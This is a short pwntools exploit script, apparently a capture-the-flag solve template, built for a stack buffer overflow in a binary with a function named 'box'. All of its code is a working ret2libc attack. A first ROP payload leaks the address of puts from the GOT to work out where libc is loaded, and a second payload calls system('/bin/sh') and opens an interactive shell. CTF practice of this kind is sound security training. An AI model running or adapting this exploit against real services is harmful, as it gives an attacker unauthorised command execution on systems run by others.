# Contains only the things pwninit doesn't do for us automatically

# So gdb.attach() spawns a horizontal split in tmux
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

offset = 56
pop_rdi = 0x40142b
ret = 0x401016

# Copy pasta to pwninit solve.py script
def pwn(r): # r is remote
    payload1 = b"A"*offset
    payload1 += p64(pop_rdi)
    payload1 += p64(exe.got["puts"])
    payload1 += p64(exe.plt["puts"])
    payload1 += p64(exe.symbols["box"])
    r.sendline(payload1)

    # Figure out how to receive just until the puts leak
    r.recvline()

    libc.address = u64(r.recvuntil("\n").strip().ljust(8, b"\x00")) - libc.symbols["puts"]
    log.info(f"{hex(libc.address)=}")

    payload2 = b"A"*offset
    payload2 += p64(ret)
    payload2 += p64(pop_rdi)
    payload2 += p64(next(libc.search(b"/bin/sh\x00")))
    payload2 += p64(libc.symbols["system"])
    r.sendline(payload2)
    r.interactive()
